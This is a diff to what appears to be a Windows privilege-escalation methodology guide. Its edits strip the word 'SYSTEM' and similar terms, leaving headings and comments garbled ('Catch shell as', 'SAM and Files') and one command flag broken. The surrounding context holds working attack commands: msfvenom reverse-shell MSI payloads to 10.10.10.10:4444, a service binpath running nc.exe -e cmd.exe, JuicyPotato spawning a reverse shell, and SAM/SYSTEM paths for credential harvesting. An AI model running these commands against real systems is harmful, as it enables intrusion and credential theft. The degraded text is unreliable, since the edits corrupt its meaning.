@@ -32,11 +32,11 @@ Provide systematic methodologies for discovering and exploiting privilege escala
 - **Vulnerability Report**: Documentation of misconfigurations and exploits
 - **Remediation Recommendations**: Fixes for identified weaknesses
 
-## Core Workflow
+## Workflow
 
-### 1. System Enumeration
+### 1. Enumeration
 
-#### Basic System Information
+#### Basic Information
 
 ```powershell
 
@@ -134,7 +134,7 @@ WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get
 
 ### 2. Credential Harvesting
 
-#### SAM and SYSTEM Files
+#### SAM and Files
 
 ```powershell
 
@@ -144,7 +144,7 @@ WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get
 %SYSTEMROOT%\System32\config\RegBack\SAM
 %SYSTEMROOT%\System32\config\SAM
 
-# SYSTEM file locations
+# file locations
 
 %SYSTEMROOT%\repair\system
 %SYSTEMROOT%\System32\config\SYSTEM
@@ -312,7 +312,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi
 
-# Install (runs as SYSTEM)
+# Install (runs as)
 
 msiexec /quiet /qn /i C:\evil.msi
 ```
@@ -449,7 +449,7 @@ wsl whoami
 
 wsl --default-user root
 
-# Or: ubuntu.exe config --default-user root
+# Or: ubuntu.exe config -default-user root
 
 # Spawn shell as root
 
@@ -505,7 +505,7 @@ C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 
 ## Constraints and Limitations
 
-### Operational Boundaries
+### Boundaries
 
 - Kernel exploits may cause system instability
 - Some exploits require specific Windows versions
@@ -549,7 +549,7 @@ sc stop MyService
 sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
 sc start MyService
 
-# Catch shell as SYSTEM
+# Catch shell as
 
 ```
 
@@ -572,7 +572,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o
 
 msiexec /quiet /qn /i C:\Users\Public\shell.msi
 
-# Catch SYSTEM shell
+# Catch shell
 
 ```
 
@@ -590,7 +590,7 @@ whoami /priv
 
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
 
-# Catch SYSTEM shell
+# Catch shell
 
 ```
 
